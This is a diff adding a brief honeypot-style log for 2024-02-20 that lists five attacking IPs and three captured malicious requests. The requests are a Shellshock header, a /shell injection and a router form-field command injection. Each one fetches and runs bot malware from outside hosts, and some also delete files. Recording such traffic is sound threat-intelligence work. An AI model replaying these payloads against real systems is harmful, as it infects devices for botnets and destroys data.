@@ -1,0 +1,24 @@
+Top 5 IPs for 2024-02-20:
+
+8.217.77.179
+123.182.149.41
+101.43.58.236
+35.207.98.222
+43.133.77.248
+
+Malcious Commands seen:
+
+GET /cgi-bin/jarrewrite.sh HTTP/1.1
+Host: HOST IP
+User-Agent: () { :; }; echo ; /bin/bash -c 'cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget https://bot.layer4.bf/jack5tr.sh; curl -O https://bot.layer4.bf/jack5tr.sh; chmod 777 jack5tr.sh; sh jack5tr.sh; tftp 159.223.196.192 -c get jack5tr.sh; chmod 777 jack5tr.sh; sh jack5tr.sh; tftp -r jack5tr2.sh -g bot.layer4.bf; chmod 777 jack5tr2.sh; sh jack5tr2.sh; ftpget -v -u anonymous -p anonymous -P 21 bot.layer4.bf jack5tr1.sh jack5tr1.sh; sh jack5tr1.sh; rm -rf jack5tr.sh jack5tr.sh jack5tr2.sh jack5tr1.sh; rm -rf *'
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
+/shell?pkill+-9+arm;pkill+-9+arm7;cd+/tmp/;rm+-rf+most*;wget+http:/\\/103.28.33.96/most-arm7;+chmod+777+most-arm7;./most-arm7+exploitprivate;wget+http:/\\/103.28.33.96/most-arm;+chmod+777+most-arm;./most-arm+exploitprivate;rm+-rf+most*
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf *mpsl*;wget http://103.178.235.32/huhu.mpsl; chmod 777 huhu.mpsl; ./huhu.mpsl lblink.selfrep;rm -rf *mpsl*;
